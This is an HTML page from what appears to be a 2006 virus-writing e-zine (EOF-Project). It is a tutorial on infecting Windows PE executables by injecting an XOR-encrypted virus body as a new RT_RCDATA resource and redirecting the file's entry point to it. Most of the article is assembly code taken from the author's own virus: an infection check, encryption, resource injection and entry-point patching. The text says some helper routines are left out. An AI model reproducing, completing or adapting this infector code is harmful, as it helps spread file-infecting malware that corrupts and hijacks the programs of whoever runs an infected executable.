@@ -1,0 +1,347 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: Berniee,Fakedminded/EOF || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+                                   _________________________________ 
+                                  |Infecting PE files By Adding new |
+                                  |           resource              |
+                                  |       fakedminded/berniee       |
+                                  |         [EOF-Project]           |
+                                  |_________________________________|  
+		
+                
+ 
+
+.Introduction
+
+ Making a pe appender is done by various ways adding new section,increasing 
+last section or any other ways.
+Here I will explain infecting pe file by adding new resource which will contain our
+code.The infecting code is taken from my previous virus &quot;fag&quot;.
+NOTE:May be the following is to some point is un-understandable for some ,because
+I tried to present the method as an idea and not as explaining it in depth! .
+
+.Theory
+ 
+ The thing behind all this is getting the job (infection) by easiest way,may be there are
+other ways,but that was the easiest on for me as I started. The method use :
+BeginUpdateResource()
+UpdateResource()
+EndUpdateResource()
+which are all from kernel32.dll
+
+.GettingStarted
+
+ First thing we will load the file by LoadLibrary function,so as to use FindReseource()to see if ourvirus is already there in that exe file.By checking the resource name
+ which is is 123 type RT_RCDATA in this demonstartion ,if it was there we just abort 
+infection,you may find other ways to check for the virus infection use your imagination.
+
+-------------------CODE------------------
+nfkt_this:
+
+
+mov [ebp+offset v_file],eax      
+push [ebp+offset v_file]         
+call [ebp+offset ALoadLibraryF]  
+or eax,eax
+jz exit_nfkt
+mov [ebp+offset bwr],eax	 ;note I used the variable bwr
+				 ;so as not increasing no. of variables in use
+
+push RT_RCDATA
+push 1234
+push [ebp+offset bwr]
+call [ebp+offset AFindResourceF];checking the virus presence,not found proceed infection.
+or eax,eax
+jnz exit_nfkt
+-----------------END OF CODE--------------
+
+ Then we we go on checking if it is pe! :p .
+After that we go and we make another check for resource by checking Res. Directory
+ address if it is zeroed or not(can be omitted since we already checked it by res. func)
+[
+cmp dword ptr [esi+136],0
+je exit_nfkt
+]
+Next we save image base and the old_eip(old entry point).
+Then FreeLibrary after getting the info. required (image base &amp; entry point)
+
+-----------------CODE---------------------
+
+mov esi,dword ptr [ebp+offset bwr]
+cmp word ptr [esi],&quot;ZM&quot;
+jne exit_nfkt
+
+add esi,[esi+3ch]
+cmp word ptr [esi],&quot;EP&quot;
+jne exit_nfkt
+
+
+cmp dword ptr [esi+136],0
+je exit_nfkt
+
+
+mov eax,[esi+40]
+mov ebx,[esi+52]
+mov [ebp+offset image_base],ebx
+mov [ebp+offset old_eip],eax
+
+push [ebp+offset bwr]
+call [ebp+offset AFreeLibraryF]
+
+-----------------END OF CODE--------------
+
+.Pursuing Infection
+ 
+ Now After we checked the file has not been yet infected and after taking two variables
+(image base and old entrypoint).We continue in our goal infection by addinf new resource.
+
+The followinf functions have the major role:
+
+1-HANDLE BeginUpdateResource
+
+(   LPCTSTR pFileName,
+    BOOL bDeleteExistingResources
+);
+
+as you can see the function needs the name of file--&gt;the victive file
+and the other option is to tell us if we want all the resources to be deleted
+and replaced by ours or just add the new resources of ours,choose FLASE
+because we dont want to remove icon and other resources of that file.this function
+will return a handle that we save by pushing to stack inthe code below .
+
+
+2-BOOL UpdateResource(        
+    HANDLE hUpdate,
+    LPCTSTR lpType,
+    LPCTSTR lpName,
+    WORD wLanguage,
+    LPVOID lpData,
+    DWORD cbData
+);
+
+Handle, our handle from BeginUpdateResource
+lpType,RT_RCDATA that what we need no icons :) 
+lpName,1234 the name you can choose whatever names you want
+wLanguage,LANG_ENGLISH
+lpData,pointer to our virus body
+cbData,size of our virus..
+
+
+3-BOOL EndUpdateResource(          
+    HANDLE hUpdate,
+    BOOL fDiscard
+);
+handle,we just pop from the stack of the previous saved handle.
+fDiscard,we put it FALSE announcing the changing to be done
+see next code.
+[ the following code has a simple xor encoder( &quot;fag&quot; virus ) ]
+-----------------CODE--------------------
+push vir_size
+push 0
+call dword ptr [ebp+offset AGlobalAllocF] ;allocate enough memory for our encrypted vir
+or eax,eax
+je exit_nfkt
+
+mov [ebp+offset v_mem],eax
+mov esi,offset Start
+add esi,ebp
+mov edi,[ebp+offset v_mem]
+
+mov ecx,vir_size
+rep movsb
+
+mov ecx,vir_size
+sub ecx,stub_size
+mov eax,[ebp+offset v_mem]
+add eax,stub_size
+
+_encrypt:
+xor byte ptr [eax],12 			 ;simple encryption by xor
+inc eax
+loop _encrypt
+
+push FALSE
+push [ebp+offset v_file]
+
+call dword ptr [ebp+offset ABeginUpdateResourceF] ;starting our res. based infection (see
+						  ;above about the functions,which was 
+						  ;discussed)
+or eax,eax
+jz exit_nfkt
+push eax
+
+
+push [ebp+offset v_mem]
+
+push LANG_ENGLISH
+push 1234
+push RT_RCDATA
+push eax
+call dword ptr [ebp+offset AUpdateResourceF]	;adding the RT_RCDATA 1234 resource
+or eax,eax
+jz exit_nfkt
+
+
+pop eax
+push FALSE
+push eax
+call dword ptr [ebp+AEndUpdateResourceF]	;ending our resource update
+or eax,eax
+jz exit_nfkt
+
+-----------------END OF CODE--------------
+
+
+
+.Fixing EntryPoint 
+
+ You may have noticed that I didnt use epo in &quot;fag&quot; virus,so I had to change the old entry
+point .Here using a rather lame method:
+ Opening the file and finding out where the hell our code goes and how many offsets
+is it far from .res section physical offset to add .res section Virtual Address to 
+its offset from it to get the new entry point.
+
+see code :
+-----------------CODE---------------------
+
+push 0
+push 0
+push 3
+push 0
+push 2h
+push 40000000h or 80000000h
+
+push [ebp+offset v_file]
+
+call dword ptr [ebp+offset ACreateFileF]
+or eax,eax
+jz exit
+
+mov [ebp+offset v_filehandle],eax
+
+push 0
+push eax
+call dword ptr [ebp+offset AGetFileSizeF]
+or eax,eax
+jz exit_nfkt
+mov dword ptr [ebp+offset v_size ],eax
+
+push eax
+push 0
+call dword ptr [ebp+offset AGlobalAllocF]
+or eax,eax
+jz exit_nfkt
+mov dword ptr [ebp+offset v_mem],eax
+
+push 0
+
+mov eax,offset bwr
+add eax,ebp
+push eax
+push dword ptr [ebp+offset v_size]
+push dword ptr [ebp+offset v_mem]
+
+push dword ptr  [ebp+offset v_filehandle]
+call dword ptr [ebp+offset AReadFileF]
+or eax,eax
+jz exit_nfkt
+
+mov esi,dword ptr [ebp+offset v_mem]
+cmp word ptr [esi],&quot;ZM&quot;
+jne exit_nfkt
+
+add esi,[esi+3ch]
+cmp word ptr [esi],&quot;EP&quot;
+jne exit_nfkt
+push esi
+
+
+xor ecx,ecx
+xor ebx,ebx
+mov bx,word ptr [esi+20] ;ebx size of optional header
+mov cx,word ptr [esi+6]  ;ecx no. of sections
+
+add esi,24
+add esi,ebx
+
+xor ebx,ebx
+l00p_rsrc:
+cmp dword ptr [esi],&quot;rsr.&quot;
+je found_rsrc
+add esi,40
+loop l00p_rsrc
+jmp exit_nfkt
+
+found_rsrc:
+mov ecx,[esi+16]
+mov esi,[esi+20]
+add esi,[ebp+offset v_mem]
+push ecx
+-----------------END OF CODE--------------
+
+here take a break,see that I put a marker in virus body at the beginning
+(notice in original virus--with all its contents--)
+so I check this marker to know the offset of my virus body away from
+from .res section begining.
+-----------------CODE---------------------
+l00p_marker:
+cmp word ptr [esi],'kcik'
+je here_vir
+inc esi
+loop l00p_marker
+here_vir:
+
+pop edx
+sub edx,ecx
+sub edx,2
+
+pop edi
+
+add edx,dword ptr [edi+136]     
+mov dword ptr [edi+40],edx             ;new entry point
+
+push 0
+push 0
+push FILE_BEGIN
+push dword ptr [ebp+offset v_filehandle]
+call dword ptr [ebp+offset ASetFilePointerF]
+
+
+
+push 0
+
+mov eax,offset bwr
+add eax,ebp
+push eax
+push dword ptr [ebp+offset v_size]
+push dword ptr [ebp+offset v_mem]
+
+push dword ptr  [ebp+offset v_filehandle]
+call dword ptr [ebp+offset AWriteFileF]
+
+ 
+ret
+
+exit_nfkt:
+-----------------END OF CODE--------------
+
+ Now what we all need is to take the old entry point and add image base to it
+and jmp to it.
+ I left other things like getting kernel base and other needed functions
+because as I said I only wanted to present the method of infection and the other
+things are left to be done by you.
+
+.FinalWords
+ If you you have any comments feedbacks or curses just contacting me through eof-project
+site or throught my site ,If you ever felt this method is lame or unworthy reading !
+just forget about it and move on in your coding life and dont blame me of the time you 
+and me wasted,and remember shitting also take time from your life :\ .
+Note :: Recently I have found some bugs regarding fag-virus,so the above tutorial represent 
+idea rather than copy-paste code...
+
+
+|| berniee/fakedminded[EOF-Project.net] || Sept.2006 || ass-koder.de.vu
+</pre></body></html>
